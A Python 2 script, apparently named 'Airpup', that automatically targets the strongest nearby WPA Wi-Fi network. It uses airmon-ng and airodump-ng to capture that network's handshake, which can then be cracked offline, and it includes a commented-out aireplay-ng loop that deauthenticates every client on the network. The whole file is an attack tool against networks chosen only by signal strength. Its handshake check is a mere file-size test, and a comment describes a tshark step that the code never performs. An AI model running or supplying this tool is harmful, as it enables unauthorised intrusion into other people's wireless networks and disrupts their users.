import os
import time
from subprocess import Popen, call

# Don't try to read these (known APs)
blackList = [ "BSSIDGOESHERE" ]

# setup airmon assuming we have a wlan0 card
call(["airmon-ng", "stop", "wlan0"])
call(["airmon-ng", "start", "wlan0", "1"])

# setup airodump on a timer
p = Popen(["airodump-ng", "wlan0mon", "-o" ,"csv", "-w", "airpuptmp"])

# run for 60 seconds, then terminate the process
timeout = 60
endtime = time.time() + timeout
while time.time() < endtime:
    time.sleep(0.4)
if p.poll() is None:
    p.terminate()
    p.wait()

# parse the Airodump CSV file
with open('airpuptmp-01.csv') as f:
    bssids = f.read().split("\r\n\r\n")[0]
	
keys = ['bssid', 'first_seen', 'last_seen', 'channel', 'speed', 'privacy', 'cipher', 'authentication', 'power', 'beacons', 'ivs', 'lan', 'id-length', 'essid', 'key']
cells = []
for line in bssids.split('\r\n')[2:]:
    cell = dict(zip(keys, [cell.strip() for cell in line.split(',')]))
    if cell["power"] != '-1': # sometimes we get strays
        cells.append(cell)

# delete our temporary file
os.remove("airpuptmp-01.csv")

# lets find the best cell based on the signal strength
bestCell = None
bestSignal = 999
for cell in cells:
    if abs(int(cell["power"])) < bestSignal and 'WPA' in cell["privacy"] and cell["bssid"] not in blackList:
        bestSignal = abs(int(cell["power"]))
        bestCell = cell

# Target acquired, start airodumping our target bssid
print "Target Acquired - " + bestCell["essid"]

# setup airodump
p = Popen(["airodump-ng", "wlan0mon", "-c", bestCell["channel"], "--bssid", bestCell["bssid"], "-w", bestCell["bssid"]])

# check the handshake every 10.0 seconds
checkHandshake = 10.0
handshakeFound = False
while handshakeFound == False:
    time.sleep(checkHandshake)

    # de-authenticate every client :[]
    # keys = ['mac', 'first_seen', 'last_seen', 'power', '# packets', 'bssid', 'essid']
    # clients = []
    # for line in bssids.split('\r\n')[6:]:
    #     client = dict(zip(keys, [client.strip() for client in line.split(',')]))
    #     clients.append(client)
    
    # for client in clients:
    #     os.system("aireplay-ng -0 5 -a " + bestCell["bssid"] + " -c " + client["mac"] + " wlan0mon")

    # use wpaclean to filter out handshakes and beacons
    os.system('cp ' + bestCell["bssid"] + '-01.cap tmp.cap')
    os.system('wpaclean airpuptmp.cap tmp.cap')
    os.system('rm -rf tmp.cap')
    
    # use tshark to filter our handshake
    f = open('airpuptmp.cap', 'rb')
    bytes = f.read()
    f.close()
    if len(bytes) > 24:
        handshakeFound = True

# do not dump anymore, we are finished
if p.poll() is None:
    p.terminate()
    p.wait()
    
print "Found handshake, Airpup complete [+]"
